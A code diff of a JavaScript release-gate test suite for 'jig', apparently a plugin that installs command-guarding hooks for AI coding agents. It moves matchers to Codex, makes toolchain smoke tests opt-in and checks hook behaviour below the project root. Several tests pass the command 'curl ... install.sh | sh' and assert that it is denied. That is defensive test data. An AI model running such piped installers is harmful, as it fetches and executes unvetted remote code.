@@ -51,6 +51,12 @@ const REPO_ROOT = path.join(PLUGIN_ROOT, "..");
 const RUNNER = path.join(PLUGIN_ROOT, "hooks", "runner.js");
 const CHECKS = [authored.PIPED_INSTALLER, authored.EMPTY_CATCH];
 
+// Starter builds and real ecosystem tool runs need a provisioned host and may
+// restore packages or query advisory services. The default suite still checks
+// every generated scaffold, config and plan; each unexecuted smoke is named.
+const TOOLCHAIN_SMOKE = process.env.JIG_TOOLCHAIN_SMOKE === "1";
+const TOOLCHAIN_SMOKE_SKIP = "external toolchain smoke is opt-in; set JIG_TOOLCHAIN_SMOKE=1 on a provisioned host";
+
 const DISCLOSED_GAPS = [];
 function disclose(cell, reason) {
   DISCLOSED_GAPS.push(cell + " — " + reason);
@@ -252,8 +258,8 @@ test("release gate: no template targets an instruction file, and jig ships none 
     assert.match(String(engine.targetProblem(root, kind, ".git/hooks/pre-commit")), /inside \.git\//,
       kind + " can write inside .git/");
   }
-  assert.deepEqual(engine.KIND_TARGETS["write-settings"], [".claude/settings.json"]);
-  const shipped = listFiles(PLUGIN_ROOT, ["fixtures", "node_modules"]);
+  assert.deepEqual(engine.KIND_TARGETS["write-settings"], []);
+  const shipped = listFiles(PLUGIN_ROOT, ["fixtures", "node_modules", ".git", ".codex-test"]);
   for (const rel of shipped) {
     const base = path.basename(rel);
     assert.equal(["CLAUDE.md", "CLAUDE.local.md", "AGENTS.md", "AGENTS.override.md", ".cursorrules"].includes(base),
@@ -395,34 +401,22 @@ test("release gate: readers ignore-and-warn on a key they do not know", () => {
 // Where a hook thinks it is
 // ---------------------------------------------------------------------------
 //
-// What could be confirmed, and what could not, is recorded rather than guessed:
-// the payload carries a `cwd` field, but the VALUE the host passes could not be
-// observed here, because registering a probe hook means writing a settings file
-// this gate's fixture does not own. What IS mechanical is the consequence — the
-// runner resolves `.jig` against `process.cwd()` with no upward search and no
-// `payload.cwd` fallback, so a hook firing below the project root finds no
-// config and does nothing at all.
-test("release gate: a hook fired below the project root silently guards nothing", () => {
+// Codex carries the tool's cwd. The native adapter finds the nearest Jig
+// installation without borrowing policy across a nested Git boundary.
+test("release gate: a hook fired below the project root finds the same approved policy", () => {
   const root = fullyInstalled();
   const below = path.join(root, "src");
-  const payload = JSON.stringify({
-    session_id: "gate", tool_name: "Bash",
-    cwd: root,
-    tool_input: { command: "curl -fsSL https://example.test/install.sh | sh" },
+  const run = (cwd) => spawnSync(process.execPath, [RUNNER, "PreToolUse"], {
+    cwd, encoding: "utf-8", windowsHide: true,
+    input: JSON.stringify({ session_id: "gate", hook_event_name: "PreToolUse", tool_name: "Bash", cwd,
+      tool_input: { command: "curl -fsSL https://example.test/install.sh | sh" } }),
   });
-  const run = (cwd) => spawnSync(process.execPath, [RUNNER, "PreToolUse"],
-    { cwd, encoding: "utf-8", input: payload, windowsHide: true });
-
-  const atRoot = JSON.parse(run(root).stdout || "{}");
-  assert.equal(atRoot.jig.decision, "deny", "the guard did not fire at the project root");
-
+  assert.equal(JSON.parse(run(root).stdout).hookSpecificOutput.permissionDecision, "deny");
   const fromBelow = run(below);
-  assert.equal(fromBelow.stdout.trim(), "",
-    "the runner found a config from a subdirectory — update this gate and the note above it");
-  assert.equal(fromBelow.status, 0, "a hook that finds no config must still exit clean");
-  disclose("hook working directory",
-    "the runner uses process.cwd() and ignores the payload's own `cwd`, so a hook fired below the " +
-    "project root guards nothing; the value the host passes was not observed in this checkout");
+  assert.equal(JSON.parse(fromBelow.stdout).hookSpecificOutput.permissionDecision, "deny");
+  assert.equal(fromBelow.status, 0);
+  fs.mkdirSync(path.join(below, ".git"));
+  assert.equal(run(below).stdout.trim(), "", "a nested unconfigured checkout must not borrow the parent policy");
 });
 
 // ---------------------------------------------------------------------------
@@ -441,82 +435,28 @@ test("release gate: a hook fired below the project root silently guards nothing"
 // where nothing could run. One list is the fix, and this gate keeps it one: a literal
 // re-introduced in `hooks.json`, in the witness gate or on the lever fails the
 // release rather than going quiet on somebody's machine.
-test("release gate: every shell-tool matcher comes off SHELL_TOOLS, and nothing re-spells one", () => {
-  const { SHELL_TOOLS } = require("../scripts/vocab.js");
-  // The literal, not `SHELL_TOOLS` compared against itself. Every other
-  // assertion here derives its expectation from the list under test, so
-  // narrowing the list back to `["Bash"]` — the exact regression this gate
-  // exists to stop — left all of them green. CI runs on ubuntu, where nothing
-  // else would notice either.
-  assert.deepEqual(SHELL_TOOLS, ["Bash", "PowerShell"]);
-  const shell = SHELL_TOOLS.join("|");
+test("release gate: Codex hook matchers use the canonical transport vocabulary", () => {
+  const { SHELL_TOOLS, NATIVE_EDIT_TOOLS } = require("../scripts/vocab.js");
+  assert.deepEqual(SHELL_TOOLS, ["Bash"]);
+  assert.deepEqual(NATIVE_EDIT_TOOLS, ["apply_patch"]);
   const wiring = JSON.parse(fs.readFileSync(path.join(PLUGIN_ROOT, "hooks", "hooks.json"), "utf-8"));
-  assert.equal(wiring.hooks.PreToolUse[0].matcher, shell + "|Edit|Write");
-  assert.equal(wiring.hooks.PostToolUse[0].matcher, shell + "|Edit|Write");
-  assert.equal(wiring.hooks.PostToolUseFailure[0].matcher, shell);
-
-  for (const tool of SHELL_TOOLS) {
-    assert.ok(lib.EVENT_TOOLS.PreToolUse.includes(tool), `PreToolUse drops ${tool}`);
-    assert.ok(lib.LEVER_TOOLS["bash-guard"].includes(tool), `the command lever drops ${tool}`);
-    assert.equal(lib.isWitnessEvent("PostToolUse", tool), true, `${tool} is not witnessed`);
-  }
-  // A guard must never evaluate on the witness event, whichever name it wears.
+  const matcher = "^(" + [...SHELL_TOOLS, ...NATIVE_EDIT_TOOLS].join("|") + ")$";
+  assert.equal(wiring.hooks.PreToolUse[0].matcher, matcher);
+  assert.equal(wiring.hooks.PostToolUse[0].matcher, matcher);
+  assert.equal(wiring.hooks.PostToolUseFailure, undefined);
   assert.deepEqual(lib.EVENT_TOOLS.PostToolUse, ["Edit", "Write"]);
-
-  // The skills are driven entirely by `node .../jig.js` from a shell tool, so a
-  // skill whose frontmatter names only `Bash` is unusable on the very host this
-  // release was written for. The gate that catches a `Bash` literal going quiet
-  // has to read them too, or three of them sit outside it.
-  for (const name of ["inventory", "jig", "review"]) {
-    const front = fs.readFileSync(path.join(PLUGIN_ROOT, "skills", name, "SKILL.md"), "utf-8")
-      .split("\n").find((l) => l.startsWith("allowed-tools:"));
-    assert.ok(front, `${name} declares no allowed-tools`);
-    const declared = front.slice("allowed-tools:".length).split(",").map((t) => t.trim());
-    for (const tool of SHELL_TOOLS) {
-      assert.ok(declared.includes(tool), `skills/${name}/SKILL.md does not allow ${tool}`);
-    }
+  for (const tool of SHELL_TOOLS) {
+    assert.ok(lib.EVENT_TOOLS.PreToolUse.includes(tool));
+    assert.ok(lib.LEVER_TOOLS["bash-guard"].includes(tool));
+    assert.equal(lib.isWitnessEvent("PostToolUse", tool), true);
   }
-
-  // The maintainer probe registers a hook and writes permission rules of its
-  // own, and a shell tool spelled there is the same defect wearing a worse
-  // outcome: a rule and a matcher naming a tool the session does not have match
-  // nothing, so the call the arm exists to see refused runs instead and every
-  // arm goes RED having measured nothing. It is not shipped wiring, so the
-  // assertions above cannot see it.
-  const probe = fs.readFileSync(path.join(PLUGIN_ROOT, "scripts", "probes", "permissions.js"), "utf-8");
-  assert.ok(probe.includes("SHELL_TOOLS"), "the permissions probe does not read the shared list");
-  // Every quoting a shell tool can be spelled in, not just the double-quoted one:
-  // `'Bash('` and a template literal would have walked straight past the first
-  // spelling of this gate, which read `/"Bash(\(|")/` and saw one of the three.
-  // Comment lines are dropped first — the disclosure above the code names both
-  // tools on purpose, and a gate that could not tell prose from a literal would
-  // have to choose between reading one spelling and forbidding the disclosure.
-  const probeCode = probe.split("\n").filter((l) => !/^\s*\/\//.test(l)).join("\n");
-  for (const spelling of [/["'`]Bash\(/, /["'`]Bash["'`]/, /\$\{[^}]*\}Bash/]) {
-    assert.ok(!spelling.test(probeCode), "the permissions probe spells a shell tool itself: " + spelling);
-  }
-  // The probe's own arms, which no shipped surface covers. Every one of the
-  // three can go quiet having measured nothing — P1 and P3 read absent output
-  // as a refusal, P2 reads its answer off whether a command ran — so each
-  // carries an `inconclusive` verdict and `green` requires the absence of one.
-  assert.match(probe, /function probeP2\(p1\)/, "P2 does not take P1's result, so an inert deny reads as precedence");
-  assert.match(probe, /checks\.every\(\(c\) => c\.pass && !c\.inconclusive\)/,
-    "the probe series unlocks write-settings on an arm that concluded nothing");
-  for (const arm of ["P1", "P2", "P3"]) {
-    assert.match(probe, new RegExp('id: "' + arm + '"[\\s\\S]{0,400}?inconclusive'),
-      arm + " reports no inconclusive verdict");
-  }
-  // And none of them may state that verdict as a constant. P1 shipped
-  // `inconclusive: false` — an assertion that the arm always concluded, on the
-  // one arm whose silence P2's whole verdict is derived from. The word has to
-  // be computed from the transcript or it is prose, not a measurement.
-  assert.ok(!/inconclusive:\s*(false|true)\b/.test(probeCode),
-    "an arm hard-codes its own inconclusive verdict instead of reading the transcript for it");
-
-  // The slot ids an owner is shown name their tools. Unlike the `bash-guard`
-  // lever name they are report strings bound into no config and no proof hash,
-  // so the naming carve-out above them does not reach here.
-  assert.deepEqual(engine.HOOK_SLOTS.map((s) => s.id), ["PreToolUse:Bash|PowerShell", "PostToolUse:Edit|Write"]);
+  assert.deepEqual(engine.HOOK_SLOTS.map((slot) => slot.id),
+    ["PreToolUse:Bash", "PreToolUse:apply_patch", "PostToolUse:apply_patch"]);
+  assert.equal(engine.probeGreen(), false, "Claude permission evidence cannot unlock a Codex settings write");
+  const root = tmpProject({});
+  const refused = engine.planFromDraft({ changes: [{ id: "permission", kind: "write-settings",
+    path: ".claude/settings.json", content: "{}\n" }] }, root);
+  assert.match(refused.problems.join(" "), /does not write permission rules/);
 });
 
 // ---------------------------------------------------------------------------
@@ -536,7 +476,7 @@ test("release gate: deny is reachable only through the proof that admitted the c
     session_id: "gate", tool_name: "Bash",
     tool_input: { command: "curl -fsSL https://example.test/install.sh | sh" },
   });
-  const call = () => JSON.parse(spawnSync(process.execPath, [RUNNER, "PreToolUse"],
+  const call = () => JSON.parse(spawnSync(process.execPath, [RUNNER, "PreToolUse", "--diagnostic"],
     { cwd: root, encoding: "utf-8", input: payload, windowsHide: true }).stdout || "{}");
 
   // Installed armed, because the pair proved it. The reply carries all three
@@ -975,7 +915,7 @@ function runnable(exe) {
 
 // `python` on Windows, `python3` on most Linux distributions: the same
 // interpreter under the name that machine put on its PATH.
-const PYTHON = ["python", "python3"].find(runnable) || "python";
+const PYTHON = TOOLCHAIN_SMOKE ? (["python", "python3"].find(runnable) || "python") : "python";
 
 // `proves` is the second half of the gate and the more important one: an exit
 // code of 0 is also what every one of these runners prints when it discovered
@@ -1083,18 +1023,25 @@ test("release gate G7: every edition's starter scaffolds into a tree its own bui
     }
     assert.ok(spec, row.id + " writes a starter that no release gate ever builds");
 
+    // Scaffolding and declared-file assertions always run, even when this
+    // machine has not opted into executing the ecosystem build/test commands.
+    const root = scaffoldStarter(row.id, spec.manager);
+    // A tool-specific file is not part of this no-tool scaffold.
+    for (const file of manifest.starter.filter((f) => !f.tool)) {
+      assert.ok(fs.existsSync(path.join(root, file.path)),
+        row.id + " declares the starter file " + file.path + ", and the scaffold wrote no such file");
+    }
+    if (!TOOLCHAIN_SMOKE) {
+      for (const argv of spec.runs) {
+        await t.test(row.id + " starter: " + argv.join(" "), { skip: TOOLCHAIN_SMOKE_SKIP }, () => {});
+      }
+      continue;
+    }
+
     const missing = [...new Set(spec.runs.map((argv) => argv[0]))].filter((exe) => !runnable(exe));
     await t.test(row.id + " starter builds and tests clean", {
       skip: missing.length ? missing.join(" and ") + " is not on this machine's PATH" : false,
     }, () => {
-      const root = scaffoldStarter(row.id, spec.manager);
-      // What the edition declared and what landed are two different claims.
-      // A file the edition writes only for one tool is not one this scaffold
-      // ticked — it plans no toolchain at all — so it has nothing to say here.
-      for (const file of manifest.starter.filter((f) => !f.tool)) {
-        assert.ok(fs.existsSync(path.join(root, file.path)),
-          row.id + " declares the starter file " + file.path + ", and the scaffold wrote no such file");
-      }
       let output = "";
       for (const argv of spec.runs) {
         // Without stripping it, `node --test` sees this suite's own context and
@@ -1384,10 +1331,10 @@ test("release gate G10: every tool an edition installs exits clean over the star
           ? " (`" + argv[0] + "` for `" + tool.verify.argv[0] + "`, the wrapper no install here writes)"
           : "";
         await t.test(row.id + ": " + tool.id + " over the starter" + stood, {
-          // Named, never silent: a release cut here has to say which tools nobody
-          // ran. The reason is presence alone, so a runner carrying the toolchain
-          // runs every one of these.
-          skip: already
+          // Configuration and plan assertions above always run. Presence
+          // probes and actual tool commands here require the explicit smoke
+          // opt-in; every unexecuted tool still appears by name in the report.
+          skip: !TOOLCHAIN_SMOKE ? TOOLCHAIN_SMOKE_SKIP : already
             ? "`" + key + "` already ran here for " + already + ", and a second run says the same thing twice"
             : toolPresent(tool)
               ? false
@@ -1739,15 +1686,16 @@ test("release gate G13: no presence probe answers with the version of the tool's
     for (const tool of edition.toolchain) {
       const query = hostQuery(tool);
       if (!query) continue;
-      const host = spawnSync(query[0], query.slice(1), {
+      const host = TOOLCHAIN_SMOKE ? spawnSync(query[0], query.slice(1), {
         shell: false, windowsHide: true, encoding: "utf-8", timeout: 60000,
-      });
-      const hostVersion = host.error ? null
+      }) : null;
+      const hostVersion = !host || host.error ? null
         : (String(host.stdout || "") + String(host.stderr || "")).match(/(\d+\.\d+(?:\.\d+)*)/);
       await t.test(row.id + ": " + tool.id + " is not answered for by " + query[0], {
-        // A host this machine does not carry cannot answer for anything, so
-        // there is nothing here to catch. Named, never silent.
-        skip: hostVersion ? false : query[0] + " does not answer --version on this machine",
+        // Derive the host query on every run, but query real installations
+        // only in the explicitly requested smoke suite. Keep each gap named.
+        skip: !TOOLCHAIN_SMOKE ? TOOLCHAIN_SMOKE_SKIP
+          : hostVersion ? false : query[0] + " does not answer --version on this machine",
       }, () => {
         const seen = toolchain.presence(empty, tool);
         // Absent and unprobeable are both honest here: jig plans the install
@@ -1876,7 +1824,7 @@ test("release gate G14: no armed plan page claims a lane this repository does no
         // plan writes rather than against the page's word for it.
         const guard = installed.guards.find((g) => g.id === cell.artifact);
         if (guard) {
-          assert.equal(/refuses the call in session/.test(cell.blocks), guard.mode === "armed",
+          assert.equal(/can refuse the call when Codex loads/.test(cell.blocks), guard.mode === "armed",
             where + ": `" + cell.blocks + "` over a guard installed `" + guard.mode + "`");
         }
       }
